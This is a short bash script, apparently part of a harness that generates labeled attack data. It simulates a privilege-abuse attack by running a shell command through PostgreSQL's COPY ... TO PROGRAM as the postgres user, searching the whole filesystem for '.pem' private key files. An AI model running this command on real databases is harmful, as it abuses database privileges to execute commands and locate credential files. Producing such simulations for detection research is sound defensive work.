#!/bin/bash
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity
echo "  identity=${CASCE_USER}@${CASCE_IP}"
echo "Simulating Privilege Abuse Attack (find_keys)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_find_keys" start
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT 1) TO PROGRAM 'find / -name '*.pem' > /tmp/out_find_keys.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_find_keys" end
